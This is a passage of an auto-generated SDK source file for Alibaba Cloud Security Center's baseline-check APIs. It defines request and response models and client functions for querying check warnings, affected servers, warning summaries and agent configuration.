  riskId?: long(name='RiskId', description='The ID of the risk item.

>  You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='43'),
  status?: int32(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **6**: ignored', example='3'),
}

model DescribeCheckWarningCountResponseBody = {
  count?: int32(name='Count', description='The total number of entries returned.', example='4'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9693CBA1-1EC4-5B5A-8D96-34010D9DXXXX'),
}

model DescribeCheckWarningCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckWarningCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of alerts that are triggered by a check item.
 *
 * @param request DescribeCheckWarningCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckWarningCountResponse
 */
async function describeCheckWarningCountWithOptions(request: DescribeCheckWarningCountRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliUid)) {
    query['AliUid'] = request.aliUid;
  }
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of alerts that are triggered by a check item.
 *
 * @param request DescribeCheckWarningCountRequest
 * @return DescribeCheckWarningCountResponse
 */
async function describeCheckWarningCount(request: DescribeCheckWarningCountRequest): DescribeCheckWarningCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningCountWithOptions(request, runtime);
}

model DescribeCheckWarningDetailRequest {
  checkId?: string(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckItemWarningSummary](~~ListCheckItemWarningSummary~~) operation to query the IDs of the check items.', example='1'),
  checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.

>  To query the details of a check item, you must provide the ID of the alert that is triggered by the check item. You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of alerts.', example='98675301'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the IDs of Alibaba Cloud accounts.', example='1232428423234****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='103.25.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='01aec2da-5b57-4f38-b221-da5a0b2f****'),
}

model DescribeCheckWarningDetailResponseBody = {
  advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='You can fix it in the following ways:↵1. To configure authentication for redis service, click the redis.conf Configure complex password in requirepass, and then restart redis.↵2. In redis configuration file redis.conf The configuration is as follows: bind 127.0.0.1, only allow local access, and then restart redis'),
  checkDetailAssetInfo?: [ map[string]string ](name='CheckDetailAssetInfo', description='List of asset details to check.'),
  checkDetailColumns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key', description='Key to detect content.', example='Username'),
          showName?: string(name='ShowName', description='The detection content key corresponds to the display name.', example='UserName'),
          type?: string(name='Type', description='Display type. Value:
- **grid**: Detection grid
- **text**: text', example='text'),
        }
      ](name='Grids', description='Detection content list.'),
      key?: string(name='Key', description='Key to detect content.', example='Containername'),
      showName?: string(name='ShowName', description='The detection content key corresponds to the display name.', example='ContainerName'),
      type?: string(name='Type', description='Display type. Value:
- **grid**: Detection grid
- **text**: text', example='text'),
    }
  ](name='CheckDetailColumns', description='Detection content details.'),
  checkId?: long(name='CheckId', description='The ID of the check item.', example='946'),
  description?: string(name='Description', description='The additional information about the risk item.', example='The redis port is open to the outside world and there is no authentication option configured. In addition to directly obtaining all the information in the database, unauthorized users can also attack the system through unauthorized access vulnerability.'),
  item?: string(name='Item', description='The name of the check item.', example='Redis unauthorized access'),
  level?: string(name='Level', description='The risk level of the check item. Valid values:

*   **high**: The item is a high-risk item and is highlighted in red.
*   **medium**: The item is a medium-risk item and is highlighted in orange.
*   **low**: The item is a low-risk item and is highlighted in gray.', example='high'),
  prompt?: string(name='Prompt', description='The prompt for the risk item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  type?: string(name='Type', description='The type of the check item. Valid values:

*   **hc_exploit**: unauthorized access
*   **hc_djbh**: classified protection compliance
*   **hc_best_secruity**: best security practice
*   **hc_container**: container security
*   **hc_custom**: custom baseline
*   **cis**: Center for Internet Security (CIS) compliance
*   **weak_password**: weak password', example='hc_exploit'),
}

model DescribeCheckWarningDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckWarningDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details about a specified check item.
 *
 * @param request DescribeCheckWarningDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckWarningDetailResponse
 */
async function describeCheckWarningDetailWithOptions(request: DescribeCheckWarningDetailRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.checkWarningId)) {
    query['CheckWarningId'] = request.checkWarningId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about a specified check item.
 *
 * @param request DescribeCheckWarningDetailRequest
 * @return DescribeCheckWarningDetailResponse
 */
async function describeCheckWarningDetail(request: DescribeCheckWarningDetailRequest): DescribeCheckWarningDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningDetailWithOptions(request, runtime);
}

model DescribeCheckWarningMachinesRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of check items.', example='58'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  filterUuid?: string(name='FilterUuid', description='The instance ID of the asset that you don\\\\"t want to query.', example='2f64e1a0f9316c48*******'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='cri-rv4nvbv8iju4****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='1.2.XX.XX'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='1232428423234****'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of baselines.', example='43'),
  status?: int32(name='Status', description='The risk status of the check item. Valid values:

*   **1**: failed
*   **3**: passed', example='1'),
}

model DescribeCheckWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of the servers on which the same risk item is detected.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  machines?: [ 
    {
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-bp1dp42hgn1xcq8l****'),
      instanceName?: string(name='InstanceName', description='The instance name of the server.', example='win-oracl****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines', description='The servers on which the same risk item is detected.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B3D989EB-2E59-584C-8438-5DFAA34A****'),
}

model DescribeCheckWarningMachinesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckWarningMachinesResponseBody(name='body'),
}

/**
 * @summary Queries the servers on which the same risk item is detected by specifying a baseline and a check item.
 *
 * @param request DescribeCheckWarningMachinesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckWarningMachinesResponse
 */
async function describeCheckWarningMachinesWithOptions(request: DescribeCheckWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.filterUuid)) {
    query['FilterUuid'] = request.filterUuid;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the servers on which the same risk item is detected by specifying a baseline and a check item.
 *
 * @param request DescribeCheckWarningMachinesRequest
 * @return DescribeCheckWarningMachinesResponse
 */
async function describeCheckWarningMachines(request: DescribeCheckWarningMachinesRequest): DescribeCheckWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningMachinesWithOptions(request, runtime);
}

model DescribeCheckWarningSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c80dae73bd1be442699766b14ffd0****'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the container field. Valid values:

*   **clusterId**: the ID of the cluster
*   **image**: the name of the image
*   **imageId**: the ID of the image
*   **namespace**: the namespace', example='namespace'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the container field.', example='c819391d2d520485fa3e81e2dc2ea****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of asset groups.', example='123'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  riskName?: string(name='RiskName', description='The name of the risk item.', example='Redis'),
  riskStatus?: int32(name='RiskStatus', description='The status of the baseline check. Valid values:

*   **1**: failed
*   **3**: passed', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='219.133.XX.XX'),
  status?: string(name='Status', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='1'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **uuid**: the ID of an asset', example='uuid'),
  typeName?: string(name='TypeName', description='The level-1 type of check items.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the level-1 types of check items.', example='database'),
  uuids?: string(name='Uuids', description='The UUID of the asset.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets.', example='f03259d8-1e81-4fae-bcbb-275fb5****'),
}

model DescribeCheckWarningSummaryResponseBody = {
  count?: int32(name='Count', description='The number of check items returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the current page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='00BD7CE2-284A-4534-BD09-FB69836DD750'),
  totalCount?: int32(name='TotalCount', description='The total number of check items.', example='100'),
  warningSummarys?: [ 
    {
      checkCount?: int32(name='CheckCount', description='The number of check items.', example='10'),
      checkExploit?: boolean(name='CheckExploit', description='Indicates whether the risk item can be exploited. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      containerRisk?: boolean(name='ContainerRisk', description='Indicates  whether the risk item is a container runtime risk item. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      databaseRisk?: boolean(name='DatabaseRisk', description='Indicates whether the risk item is a database risk item. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      highWarningCount?: int32(name='HighWarningCount', description='The number of high-risk items.', example='1'),
      lastFoundTime?: string(name='LastFoundTime', description='The time when the last baseline check was performed.', example='2019-01-01 12:23:00'),
      level?: string(name='Level', description='The risk level of the risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of low-risk items.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of medium-risk items.', example='2'),
      riskId?: long(name='RiskId', description='The ID of the risk item.', example='118'),
      riskName?: string(name='RiskName', description='The name of the risk item.', example='Redis'),
      subTypeAlias?: string(name='SubTypeAlias', description='The level-2 type of the risk item.', example='Redis'),
      typeAlias?: string(name='TypeAlias', description='The level-1 type of the check item. Examples: database, system, weak password, and middleware.', example='databases'),
      warningMachineCount?: int32(name='WarningMachineCount', description='The number of assets on which risk items are detected.', example='11'),
    }
  ](name='WarningSummarys', description='The statistics of check items.'),
}

model DescribeCheckWarningSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckWarningSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the statistical information about baseline check results. The information includes the number of servers on which a baseline check is performed, the number of baseline check items, and the pass rate of check items in the last baseline check.
 *
 * @param request DescribeCheckWarningSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckWarningSummaryResponse
 */
async function describeCheckWarningSummaryWithOptions(request: DescribeCheckWarningSummaryRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistical information about baseline check results. The information includes the number of servers on which a baseline check is performed, the number of baseline check items, and the pass rate of check items in the last baseline check.
 *
 * @param request DescribeCheckWarningSummaryRequest
 * @return DescribeCheckWarningSummaryResponse
 */
async function describeCheckWarningSummary(request: DescribeCheckWarningSummaryRequest): DescribeCheckWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningSummaryWithOptions(request, runtime);
}

model DescribeCheckWarningsRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
  checkType?: string(name='CheckType', description='The type of the check item. Valid values:

*   **hc.check.type.identity_auth**: identity authentication
*   **hc.check.type.access_control**: access control
*   **hc.check.type.network_service**: network and service
*   **hc.check.type.service_conf**: service configuration
*   **hc.check.type.file_rights**: file permission
*   **hc.check.type.security_audit**: security audit
*   **hc.check.type.attack_defense**: intrusion prevention
*   **hc.check.type.others**: others', example='hc.check.type.attack_defense'),
  containerName?: string(name='ContainerName', description='The name of the container.', example='/redis'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  To obtain the Alibaba Cloud account ID, call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation.', example='127608589417****'),
  riskId?: long(name='RiskId', description='The ID of the risk item. This parameter is required.

>  To query the information about the risk items and check items of a server, you must specify the IDs of the risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.', example='10354'),
  riskStatus?: int32(name='RiskStatus', description='The status of the check item. Valid values:

*   **1**: failed
*   **2**: verifying
*   **3**: passed
*   **5**: expired
*   **6**: ignored', example='1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.

> To query specified risk items and the check items of a specified server, you must provide the ID of the server on which the baseline check is performed. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the IDs of servers.

This parameter is required.', example='d42f938c-d962-48a0-90f9-05****'),
}

model DescribeCheckWarningsResponseBody = {
  checkWarnings?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='2546'),
      checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is generated for the baseline check result.', example='212251441'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='8de456b00ff0a2009ee8ef7fc59fd0457fa44f20b8282af3e79c2a0e2492****'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='/svn-host'),
      execErrorMessage?: string(name='ExecErrorMessage', description='The error message in the check result.', example='ScriptKilledOfCpuHigh'),
      fixStatus?: int32(name='FixStatus', description='Indicates whether fixing is supported. Valid values:

*   **0**: Fixing is not supported.
*   **1**: Fixing is supported.', example='0'),
      item?: string(name='Item', description='The name of the check item.', example='passwordExpire'),
      lastHandleTime?: long(name='LastHandleTime', description='The timestamp of the latest processing of the check item risk of the machine. Unit: milliseconds.', example='1694692471000'),
      level?: string(name='Level', description='The risk level of the risk item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
      reason?: string(name='Reason', description='The description.', example='ignore'),
      status?: int32(name='Status', description='The status of the check item. Valid values:

*   **1**: failed.
*   **2**: verifying.
*   **3**: passed.
*   **5**: expired.
*   **6**: ignored.', example='1'),
      type?: string(name='Type', description='The type of the check item.', example='hc.check.type.identity_auth'),
      uuid?: string(name='Uuid', description='The ID of the server on which the baseline check is performed.', example='d42f938c-d962-48a0-90f9-****'),
    }
  ](name='CheckWarnings', description='The information about the check item.'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DFCADBA-7065-42DA-AF17-6868B9C2A8CF'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeCheckWarningsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeCheckWarningsResponseBody(name='body'),
}

/**
 * @summary Queries information about specified risk items and the check items of a specified server.
 *
 * @param request DescribeCheckWarningsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeCheckWarningsResponse
 */
async function describeCheckWarningsWithOptions(request: DescribeCheckWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.containerName)) {
    query['ContainerName'] = request.containerName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about specified risk items and the check items of a specified server.
 *
 * @param request DescribeCheckWarningsRequest
 * @return DescribeCheckWarningsResponse
 */
async function describeCheckWarnings(request: DescribeCheckWarningsRequest): DescribeCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningsWithOptions(request, runtime);
}

model DescribeClientConfSetupRequest {
  strategyTag?: string(name='StrategyTag', description='The tag that is added to the server.

This parameter is required.', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic

This parameter is required.', example='major'),
}

model DescribeClientConfSetupResponseBody = {
  clientConf?: {
    config?: string(name='Config', description='The configurations of the usage for the Security Center agent.', example='{"mem":"200","cpu":"10","cpu_all":"0"}'),
    strategyTag?: string(name='StrategyTag', description='The tag that is added to the configuration.', example='machineResource'),
    strategyTagValue?: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major'),
  }(name='ClientConf', description='The configurations of the Security Center agent.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975D****'),
}

model DescribeClientConfSetupResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClientConfSetupResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the Security Center agent.
 *
 * @param request DescribeClientConfSetupRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClientConfSetupResponse
 */
async function describeClientConfSetupWithOptions(request: DescribeClientConfSetupRequest, runtime: Util.RuntimeOptions): DescribeClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the Security Center agent.
 *
 * @param request DescribeClientConfSetupRequest
 * @return DescribeClientConfSetupResponse
 */
async function describeClientConfSetup(request: DescribeClientConfSetupRequest): DescribeClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeClientConfSetupWithOptions(request, runtime);
}

model DescribeClientConfStrategyRequest {
  tag?: string(name='Tag', description='The tag that is added to the server.

This parameter is required.', example='machineResource'),
  tagValue?: string(name='TagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic

This parameter is required.', example='major'),
}

model DescribeClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F****'),
  targetList?: [ 
    {
      uuid?: string(name='Uuid', description='The UUID of the Security Center agent.', example='2b1753a6-04d9-448e-ad17-7abdf19f****'),
    }
  ](name='TargetList', description='An array that consists of the configurations.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeClientConfStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeClientConfStrategyResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of servers to which different tags are added.
 *
 * @param request DescribeClientConfStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeClientConfStrategyResponse
 */
async function describeClientConfStrategyWithOptions(request: DescribeClientConfStrategyRequest, runtime: Util.RuntimeOptions): DescribeClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of servers to which different tags are added.
 *
